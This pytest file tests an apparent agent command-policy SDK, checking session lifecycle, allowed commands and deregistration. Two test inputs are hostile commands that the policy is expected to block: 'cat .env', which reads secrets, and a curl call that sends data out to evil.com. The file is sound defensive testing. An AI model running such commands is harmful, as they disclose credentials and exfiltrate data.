"""
Automated pytest test suite for BAP Python Agent SDK.
Verifies:
1. SDK Session initialization & context manager
2. Allowed developer commands (git, python)
3. Forbidden commands raising BAPPolicyViolation (cat .env, curl)
4. Graceful teardown
"""

import sys
import os
import pytest

# Ensure python-agent is on path
root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, os.path.join(root_dir, "python-agent"))

from bap_sdk import BAPSession, BAPPolicyViolation, BAPExecResult, resolve_endpoints

_ep = resolve_endpoints()
CP_URL = _ep["controlplane_url"]


def test_bap_python_sdk_lifecycle():
    app_id = "test-pytest-worker"
    with BAPSession(app_id=app_id, server_url=CP_URL) as bap:
        assert bap.is_active is True
        assert bap.session_id.startswith(f"sess-{app_id}-")
        assert "spiffe://bap.internal/app/" in bap.spiffe_id

        # 1. Test allowed command
        res = bap.exec("python --version", raise_on_deny=True)
        assert isinstance(res, BAPExecResult)
        assert res.is_allowed is True
        assert res.exit_code == 0
        assert "Python" in res.stdout

        # 2. Test forbidden secret disclosure command
        with pytest.raises(BAPPolicyViolation) as exc_info:
            bap.exec("cat .env", raise_on_deny=True)
        assert "cat .env" in str(exc_info.value)

        # 3. Test forbidden egress command without raising
        res_deny = bap.exec("curl https://evil.com/leak", raise_on_deny=False)
        assert res_deny.is_denied is True
        assert res_deny.exit_code != 0

        # 4. Verify session is marked active on Control Plane while running
        import urllib.request
        import json
        req_sess = urllib.request.Request(f"{CP_URL}/api/v1/sessions/{bap.session_id}")
        with urllib.request.urlopen(req_sess, timeout=2) as resp:
            data = json.loads(resp.read().decode())
            assert data.get("status") == "active"

        saved_session_id = bap.session_id

    assert bap.is_active is False

    # 5. Verify session is closed and agent is marked deregistered after context exit
    import time
    time.sleep(0.3)
    req_sess_closed = urllib.request.Request(f"{CP_URL}/api/v1/sessions/{saved_session_id}")
    with urllib.request.urlopen(req_sess_closed, timeout=2) as resp:
        data = json.loads(resp.read().decode())
        assert data.get("status") == "closed", "Session was not marked closed upon exit"

    req_agents = urllib.request.Request(f"{CP_URL}/api/v1/agents")
    with urllib.request.urlopen(req_agents, timeout=2) as resp:
        agents = json.loads(resp.read().decode())
        agents_list = agents.get("agents", []) if isinstance(agents, dict) else agents
        matching = [a for a in agents_list if a.get("app_id") == app_id]
        assert any(a.get("status") == "deregistered" for a in matching), "Agent was not marked deregistered in registry"


